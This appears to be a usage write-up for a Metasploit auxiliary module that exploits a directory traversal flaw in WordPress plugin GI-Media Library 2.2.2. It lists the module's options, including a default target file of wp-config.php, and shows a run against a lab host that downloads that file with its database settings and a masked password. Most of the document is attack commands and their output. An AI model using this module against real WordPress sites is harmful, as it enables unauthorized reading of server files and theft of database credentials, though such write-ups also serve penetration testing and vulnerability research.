#### Add Wordpress Plugin GI-Media Library File Read Vulnerability.

  Application: Wordpress Plugin 'GI-Media Library' 2.2.2
  Homepage: https://wordpress.org/plugins/gi-media-library
  Source Code: https://downloads.wordpress.org/plugin/gi-media-library.2.2.2.zip
  References: https://wpvulndb.com/vulnerabilities/7754

#### Vulnerable packages*
        
  2.2.2
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
msf > use auxiliary/scanner/http/wp_gimedia_library_file_read 
msf auxiliary(wp_gimedia_library_file_read) > show options 

Module options (auxiliary/scanner/http/wp_gimedia_library_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      3                yes       Traversal Depth (to reach the wordpress root folder)
   FILEPATH   wp-config.php    yes       The file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msf auxiliary(wp_gimedia_library_file_read) > info

       Name: WordPress GI-Media Library Plugin File Read Vulnerability
     Module: auxiliary/scanner/http/wp_gimedia_library_file_read
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Unknown
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  DEPTH      3                yes       Traversal Depth (to reach the wordpress root folder)
  FILEPATH   wp-config.php    yes       The file to read
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module exploits a directory traversal vulnerability in 
  WordPress Plugin "GI-Media Library" version 2.2.2, allowing to read 
  arbitrary files on Wordpress directory.

References:
  https://wpvulndb.com/vulnerabilities/7754
  http://wordpressa.quantika14.com/repository/index.php?id=24

msf auxiliary(wp_gimedia_library_file_read) > set RHOSTS 192.168.1.31
RHOSTS => 192.168.1.31
msf auxiliary(wp_gimedia_library_file_read) > run

[*] Downloading file...

<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress_db');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'xxxxxxxxxxxxxxx');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

...snip...

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

[+] 192.168.1.31:80 - File saved in: /home/espreto/.msf4/loot/20150424042652_default_192.168.1.31_gimedialibrary._517535.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_gimedia_library_file_read) >

```
